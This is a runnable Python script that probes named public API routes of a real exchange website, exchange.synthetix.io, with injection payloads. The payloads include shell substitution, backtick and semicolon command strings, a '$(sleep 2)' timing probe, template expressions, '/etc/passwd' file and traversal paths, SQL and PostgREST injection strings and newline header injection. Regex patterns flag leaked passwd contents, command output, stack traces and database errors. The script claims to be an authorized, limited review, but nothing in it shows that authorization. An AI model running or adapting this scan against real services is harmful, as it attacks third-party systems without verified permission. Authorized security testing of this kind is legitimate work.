#!/usr/bin/env python3
"""Low-noise server-route injection boundary probe for in-scope Synthetix Exchange APIs.

Safety constraints:
- HTTPS GET only to same-origin `/api/*` routes on exchange.synthetix.io;
- fixed, small request matrix with delays;
- no login, wallet, signature, account, order, transaction, or state mutation;
- no third-party callback, cloud metadata address, localhost, RFC1918 target, or DNS rebinding;
- time-based payload is limited to a single two-second delay per injectable route;
- response bodies are capped and redacted to hashes/excerpts.

Goals:
- identify shell/template evaluation, local-file interpretation, or stack/filesystem disclosure;
- determine whether user-controlled proxy parameters are treated as URLs rather than opaque symbols/IDs;
- detect unsafe PostgREST/SQL operator interpolation in public referral lookup routes.
"""
from __future__ import annotations

import hashlib
import json
import pathlib
import re
import statistics
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any

OUT = pathlib.Path("server_route_injection")
OUT.mkdir(parents=True, exist_ok=True)

ORIGIN = "https://exchange.synthetix.io"
UA = "Mozilla/5.0 (compatible; authorized-low-noise-security-review/1.0)"
MAX_BODY = 2 * 1024 * 1024
DELAY_SECONDS = 0.35
CANARY = "ZDB_ROUTE_CANARY_7f2a91"

SENSITIVE_PATTERNS = {
    "passwd": re.compile(rb"root:[x*]:0:0", re.I),
    "uidOutput": re.compile(rb"uid=\d+\([^)]+\)\s+gid=\d+", re.I),
    "shellError": re.compile(rb"(?:/bin/(?:ba)?sh|command not found|syntax error near unexpected token)", re.I),
    "stackTrace": re.compile(
        rb"(?:Traceback \(most recent call last\)|\bat [A-Za-z0-9_$./-]+\s*\([^\n]+:\d+:\d+\)|panic:|goroutine \d+ \[)",
        re.I,
    ),
    "filesystemPath": re.compile(rb"(?:/var/task/|/usr/src/app/|/home/(?:runner|node|vercel)/|[A-Z]:\\[^\r\n]+)", re.I),
    "databaseError": re.compile(rb"(?:SQLSTATE|PostgREST|postgres(?:ql)?|syntax error at or near|column .* does not exist)", re.I),
    "templateError": re.compile(rb"(?:jinja|handlebars|mustache|template|expression).{0,80}(?:error|exception|failed)", re.I | re.S),
}


@dataclass(frozen=True)
class Route:
    name: str
    path: str
    parameter: str
    baseline: str


ROUTES = [
    Route("macro_price", "/api/macro-price", "symbol", "BTC-USD"),
    Route("market_cap", "/api/market-cap", "assets", "BTC,ETH"),
    Route("referral_teamlead", "/api/referral-teamlead", "address", "0x0000000000000000000000000000000000000001"),
    Route("referral_teammember", "/api/referral-teammember", "address", "0x0000000000000000000000000000000000000001"),
    Route("referral_teammembers", "/api/referral-teammembers", "address", "0x0000000000000000000000000000000000000001"),
]

COMMON_CASES = [
    ("shell_substitution", f"$(printf {CANARY})"),
    ("shell_semicolon", f"x;printf {CANARY}"),
    ("shell_backticks", f"`printf {CANARY}`"),
    ("template_jinja", "{{7*7}}"),
    ("template_dollar", "${7*7}"),
    ("file_url", "file:///etc/passwd"),
    ("path_traversal", "../../../../etc/passwd"),
    ("same_origin_url", ORIGIN + "/favicon.svg"),
    ("query_delimiter", "x&limit=100000&select=*"),
    ("newline", "x\nX-ZDB-Injected: 1"),
]

REFERRAL_ONLY = [
    ("postgrest_wildcard", "*)"),
    ("postgrest_or", "or=(address.neq.0x0)"),
    ("sql_quote", "' OR '1'='1"),
]


def sha256(value: bytes | str) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def build_url(route: Route, value: str) -> str:
    return ORIGIN + route.path + "?" + urllib.parse.urlencode({route.parameter: value})


def get(url: str) -> tuple[int, bytes, dict[str, str], float, str]:
    request = urllib.request.Request(
        url,
        headers={"User-Agent": UA, "Accept": "application/json,text/plain,*/*"},
        method="GET",
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            body = response.read(MAX_BODY + 1)
            status = response.status
            headers = dict(response.headers.items())
            final_url = response.url
    except urllib.error.HTTPError as exc:
        body = exc.read(MAX_BODY + 1)
        status = exc.code
        headers = dict(exc.headers.items()) if exc.headers else {}
        final_url = exc.url
    elapsed = time.monotonic() - started
    if len(body) > MAX_BODY:
        raise RuntimeError("response exceeds safety cap")
    return status, body, headers, elapsed, final_url


def json_shape(value: Any, depth: int = 0) -> Any:
    if depth >= 4:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(k): json_shape(v, depth + 1) for k, v in sorted(value.items())}
    if isinstance(value, list):
        return {"type": "list", "count": len(value), "sample": json_shape(value[0], depth + 1) if value else None}
    return type(value).__name__


def text_excerpt(body: bytes, content_type: str) -> str | None:
    if len(body) > 128_000:
        return None
    if not any(token in content_type.lower() for token in ("json", "text", "xml", "html", "javascript")):
        return None
    text = body.decode("utf-8", errors="replace")
    # Keep the canary visible but redact long hex strings and addresses.
    text = re.sub(r"0x[a-fA-F0-9]{40,}", "<hex>", text)
    return text[:6000]


def summarize(route: Route, case: str, value: str, result: tuple[int, bytes, dict[str, str], float, str]) -> dict[str, Any]:
    status, body, headers, elapsed, final_url = result
    content_type = headers.get("Content-Type", "")
    try:
        parsed = json.loads(body)
    except Exception:
        parsed = None
    matches = {name: bool(pattern.search(body)) for name, pattern in SENSITIVE_PATTERNS.items()}
    raw_text = body.decode("utf-8", errors="replace") if len(body) <= 256_000 else ""
    return {
        "route": route.name,
        "case": case,
        "valueSha256": sha256(value),
        "requestUrlSha256": sha256(build_url(route, value)),
        "finalUrlSameOrigin": final_url.startswith(ORIGIN + route.path),
        "httpStatus": status,
        "elapsedMs": round(elapsed * 1000, 2),
        "contentType": content_type,
        "cacheControl": headers.get("Cache-Control"),
        "bodyBytes": len(body),
        "bodySha256": sha256(body),
        "jsonShape": json_shape(parsed),
        "containsLiteralInput": bool(value) and value in raw_text,
        "containsCanary": CANARY in raw_text,
        "containsEvaluated49": case.startswith("template_") and bool(re.search(r"(?<!\d)49(?!\d)", raw_text)),
        "sensitivePatternMatches": matches,
        "excerpt": text_excerpt(body, content_type),
    }


def main() -> None:
    records: list[dict[str, Any]] = []
    baseline_timings: dict[str, list[float]] = {}

    # Two baseline requests per route make the timing control robust enough for a single two-second probe.
    for route in ROUTES:
        baseline_timings[route.name] = []
        for iteration in range(2):
            result = get(build_url(route, route.baseline))
            item = summarize(route, f"baseline_{iteration + 1}", route.baseline, result)
            records.append(item)
            baseline_timings[route.name].append(item["elapsedMs"])
            time.sleep(DELAY_SECONDS)

        cases = list(COMMON_CASES)
        if route.parameter == "address":
            cases.extend(REFERRAL_ONLY)
        for case, value in cases:
            result = get(build_url(route, value))
            records.append(summarize(route, case, value, result))
            time.sleep(DELAY_SECONDS)

        # Exactly one bounded delay probe on the two proxy routes most likely to invoke a subprocess.
        if route.name in {"macro_price", "market_cap"}:
            value = "$(sleep 2)"
            result = get(build_url(route, value))
            records.append(summarize(route, "sleep_2_seconds", value, result))
            time.sleep(DELAY_SECONDS)

    timing_alerts = []
    for item in records:
        if item["case"] != "sleep_2_seconds":
            continue
        median_baseline = statistics.median(baseline_timings[item["route"]])
        delta = item["elapsedMs"] - median_baseline
        item["baselineMedianMs"] = round(median_baseline, 2)
        item["timingDeltaMs"] = round(delta, 2)
        if delta > 1500:
            timing_alerts.append(item["route"])

    alerts = {
        "commandOrFileDisclosure": [
            f"{item['route']}:{item['case']}"
            for item in records
            if any(item["sensitivePatternMatches"][name] for name in ("passwd", "uidOutput", "shellError"))
        ],
        "stackFilesystemOrDatabaseDisclosure": [
            f"{item['route']}:{item['case']}"
            for item in records
            if any(
                item["sensitivePatternMatches"][name]
                for name in ("stackTrace", "filesystemPath", "databaseError", "templateError")
            )
        ],
        "evaluatedTemplate49": [
            f"{item['route']}:{item['case']}" for item in records if item["containsEvaluated49"]
        ],
        "timingDelayOver1500Ms": timing_alerts,
        "crossOriginRedirect": [
            f"{item['route']}:{item['case']}" for item in records if not item["finalUrlSameOrigin"]
        ],
    }
    output = {
        "safety": "Fixed same-origin GET matrix; no state change, third-party callback, internal-network address, or destructive payload.",
        "origin": ORIGIN,
        "requestCount": len(records),
        "baselineTimingsMs": baseline_timings,
        "alerts": alerts,
        "records": records,
    }
    (OUT / "summary.json").write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(
        json.dumps(
            {
                "requestCount": len(records),
                "statuses": {f"{item['route']}:{item['case']}": item["httpStatus"] for item in records},
                "alerts": alerts,
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()
